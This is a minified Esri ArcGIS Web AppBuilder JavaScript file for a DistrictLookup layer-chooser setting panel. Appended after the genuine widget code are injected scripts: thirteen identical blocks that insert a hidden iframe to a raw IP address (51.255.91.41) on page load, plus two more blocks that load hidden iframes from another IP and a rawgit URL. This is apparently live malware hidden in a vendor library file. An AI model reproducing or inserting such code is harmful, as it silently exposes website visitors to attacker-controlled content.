// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/DistrictLookup/setting/LayerChooser.html":'\x3cdiv style\x3d"width: 100%; height: 100%;"\x3e\r\n    \x3cdiv class\x3d"esriCTLayerSelectorDiv"\x3e\r\n        \x3cdiv class\x3d"esriCTLayerChooserContainer row"\x3e\r\n            \x3cdiv class\x3d"esriCTlabel esriCTLabelContainer esriCTLayerChooserLabel" title\x3d"${nls.layerSelector.selectPolygonLayerLabel}"\x3e\r\n                ${nls.layerSelector.selectPolygonLayerLabel}\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTLayerChooserField"\x3e\r\n                \x3cdiv data-dojo-attach-point\x3d"itemSelectDiv"\x3e\r\n                \x3c/div\x3e\r\n                \x3cdiv class\x3d"esriCTHint"\x3e\r\n                    ${nls.layerSelector.selectPolygonLayerHintText}\r\n                \x3c/div\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTLayerChooserContainer row"\x3e\r\n            \x3cdiv class\x3d"esriCTlabel esriCTLabelContainer esriCTLayerChooserLabel" title\x3d"${nls.layerSelector.selectRelatedPointLayerLabel}"\x3e\r\n                ${nls.layerSelector.selectRelatedPointLayerLabel}\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTLayerChooserField"\x3e\r\n                \x3cselect data-dojo-attach-point\x3d"relationshipSelect" style\x3d"width: 232px;" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n                \x3c/select\x3e\r\n                \x3cdiv class\x3d"esriCTHint"\x3e\r\n                    ${nls.layerSelector.selectRelatedPointLayerHintText}\r\n                \x3c/div\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"buttonsDiv" class\x3d"buttonsDiv"\x3e\r\n        \x3cdiv class\x3d"button-container button-container-absolute" style\x3d"padding: 0px;"\x3e\r\n            \x3cdiv class\x3d"jimu-btn jimu-float-trailing jimu-leading-margin1" data-dojo-attach-point\x3d"cancelButton"\x3e\r\n                ${nls.common.cancel}\x3c/div\x3e\r\n            \x3cdiv class\x3d"jimu-btn jimu-float-trailing jimu-leading-margin1 jimu-state-disabled"\r\n                data-dojo-attach-point\x3d"okButton"\x3e\r\n                ${nls.common.ok}\x3c/div\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/_base/array dojo/promise/all dojo/Deferred dojo/on dojo/dom-class dojo/text!./LayerChooser.html jimu/dijit/LayerChooserFromMap jimu/dijit/LayerChooserFromMapWithDropbox esri/request jimu/dijit/LoadingIndicator jimu/dijit/Message dojo/domReady!".split(" "),function(h,k,l,d,m,n,p,g,b,q,c,r,t,u,v){return h([k,l],{baseClass:"jimu-widget-districtlookup-setting",templateString:q,selectRouteURL:null,agolFlag:!1,
serviceFlag:!1,startup:function(){this.inherited(arguments)},postCreate:function(){this._createPrecinctChooserArgs();this.own(g(this.cancelButton,"click",d.hitch(this,function(a){this.onCancleClick(a)})));this.own(g(this.okButton,"click",d.hitch(this,this._onOKButtonClicked)));this._initLoading()},_onNextButtonClicked:function(){b.contains(this.btnNext,"jimu-state-disabled")||(b.add(this.itemSelectDiv,"esriCTHidden"),b.remove(this.relatedLayerSelectDiv,"esriCTHidden"),b.add(this.btnNext,"esriCTHidden"),
b.remove(this.btnBack,"esriCTHidden"),""===this.relationshipSelect.value?(this._errorMessage(this.nls.layerSelector.polygonLayerNotHavingRelatedLayer),b.add(this.okButton,"jimu-state-disabled")):b.remove(this.okButton,"jimu-state-disabled"))},_onOKButtonClicked:function(){var a;if(!b.contains(this.okButton,"jimu-state-disabled"))if(this.precinctLayerInfo){if(""===this.relationshipSelect.value)return this._errorMessage(this.nls.layerSelector.errorInSelectingRelatedLayer),!1;a={polygonLayerInfo:this.precinctLayerInfo,
relatedLayerInfo:this.pollingPlaceInfo[this.relationshipSelect.value]};this.onOkClick(a)}else return this._errorMessage(this.nls.layerSelector.errorInSelectingPolygonLayer),!1},_createPrecinctChooserArgs:function(){var a,b;a=c.createFeaturelayerFilter(["polygon"],!1);b=c.createQueryableLayerFilter();a={multiple:!1,createMapResponse:this.map.webMapResponse,showLayerTypes:["FeatureLayer"],filter:c.andCombineFilters([a,b])};a=new c(a);a=new r({layerChooser:a});a.placeAt(this.itemSelectDiv);a.startup();
this.own(g(a,"selection-change",d.hitch(this,this._createPollingPlaceLayerOptions)))},_initLoading:function(){this.loading=new u({hidden:!0});this.loading.placeAt(this.domNode);this.loading.startup()},onOkClick:function(a){return a},onCancleClick:function(a){return a},_createPollingPlaceLayerOptions:function(a){var e=[],c;if(a&&0<a.length){this.precinctLayer=a[0];this.precinctLayerInfo={url:this.precinctLayer.url,geometryType:"esriGeometryPolygon",id:a[0].id};this.precinctLayerInfo.layerId=this.precinctLayer.layerId?
this.precinctLayer.layerId:this.precinctLayer.url.substr(this.precinctLayer.url.lastIndexOf("/")+1,this.precinctLayer.url.length);var f=this.precinctLayer.url.substr(0,this.precinctLayer.url.lastIndexOf("/")+1);this.precinctLayerInfo.baseURL=f;this.pollingPlaceInfo=[];c=[];m.forEach(this.precinctLayer.relationships,d.hitch(this,function(a){var b=new p;c.push(b);t({url:f+a.relatedTableId,content:{f:"json"},handleAs:"json"}).then(d.hitch(this,function(a){b.resolve(a)}),d.hitch(this,function(){b.resolve()}))}));
n(c).then(d.hitch(this,function(a){for(var d,c=0;c<a.length;c++)a[c]&&"esriGeometryPoint"===a[c].geometryType&&(d={url:f+a[c].id,baseURL:f,relationShipId:this.precinctLayer.relationships[c].id,layerId:a[c].id,geometryType:"esriGeometryPoint",title:a[c].name},d.title&&(this.pollingPlaceInfo[e.length]=d,e.push({label:this.pollingPlaceInfo[e.length].title,value:e.length})));0<e.length?(this.relationshipSelect.options.length=0,e[0].selected=!0,this.relationshipSelect.addOption(e),b.remove(this.okButton,
"jimu-state-disabled")):this._resetRelatedLayerSelector()}),d.hitch(this,function(){this._resetRelatedLayerSelector()}))}else this._resetRelatedLayerSelector()},_resetRelatedLayerSelector:function(){this.relationshipSelect.value="";this.relationshipSelect.options.length=0;this.relationshipSelect.addOption({value:"",label:"",selected:!0});b.add(this.okButton,"jimu-state-disabled");this._errorMessage(this.nls.layerSelector.polygonLayerNotHavingRelatedLayer)},_onBtnBackClicked:function(){b.remove(this.itemSelectDiv,
"esriCTHidden");b.add(this.relatedLayerSelectDiv,"esriCTHidden");b.remove(this.btnNext,"esriCTHidden");b.add(this.btnBack,"esriCTHidden")},_errorMessage:function(a){(new v({message:a})).message=a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});